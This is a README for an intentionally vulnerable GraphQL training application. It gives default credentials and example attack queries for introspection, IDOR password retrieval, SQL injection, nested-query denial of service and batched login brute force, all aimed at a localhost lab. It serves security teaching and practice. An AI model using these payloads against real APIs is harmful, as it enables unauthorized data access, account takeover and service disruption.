# DVGA - Damn Vulnerable GraphQL Application

## Overview
DVGA (Damn Vulnerable GraphQL Application) is an intentionally vulnerable implementation of Facebook's GraphQL technology to learn and practice GraphQL security.

## Quick Start

**Access URL**: http://localhost:5013/graphiql

**Default Credentials**:
- Username: `admin`
- Password: `password`

## Vulnerabilities

### 1. Information Disclosure
- **Introspection**: Query the entire schema structure
- **Field Suggestions**: GraphQL's helpful error messages leak schema info
- **Example**:
  ```graphql
  {
    __schema {
      types {
        name
        fields {
          name
          type {
            name
          }
        }
      }
    }
  }
  ```

### 2. Broken Authorization
- **IDOR**: Access other users' data by manipulating IDs
- **Example**:
  ```graphql
  query {
    user(id: "2") {
      username
      password
    }
  }
  ```

### 3. Injection Attacks
- **SQL Injection** in search queries
- **NoSQL Injection** in filters
- **Example**:
  ```graphql
  query {
    search(term: "' OR '1'='1") {
      id
      title
    }
  }
  ```

### 4. Denial of Service
- **Query Depth Attack**: Deeply nested queries
- **Resource Exhaustion**: Expensive queries
- **Example**:
  ```graphql
  query {
    users {
      posts {
        comments {
          author {
            posts {
              comments {
                # ... continue nesting
              }
            }
          }
        }
      }
    }
  }
  ```

### 5. Batching Attacks
- **Brute Force**: Multiple queries in one request
- **Example**:
  ```graphql
  query {
    user1: login(username: "admin", password: "pass1")
    user2: login(username: "admin", password: "pass2")
    user3: login(username: "admin", password: "pass3")
    # ... continue
  }
  ```

## Exploitation Tools

### GraphQL Introspection
```bash
# Using curl
curl -X POST http://localhost:5013/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'
```

### GraphQL Voyager
Access the visual schema explorer at: http://localhost:5013/voyager

### Using InQL (Burp Extension)
1. Install InQL extension in Burp Suite
2. Send GraphQL endpoint to Scanner
3. Generate queries from introspection

## Learning Objectives
- Understanding GraphQL security risks
- Query depth and complexity attacks
- Authorization bypass techniques
- Information disclosure via introspection
- Rate limiting and query cost analysis

## Defense Mechanisms (What's Missing)
- ❌ Query depth limiting
- ❌ Query complexity analysis
- ❌ Field-level authorization
- ❌ Introspection disabled in production
- ❌ Rate limiting
- ❌ Query whitelisting

## Additional Resources
- [GraphQL Security Best Practices](https://www.apollographql.com/blog/graphql/security/9-ways-to-secure-your-graphql-api-security-checklist/)
- [OWASP GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [GraphQL Security Testing](https://github.com/dolevf/graphql-security) 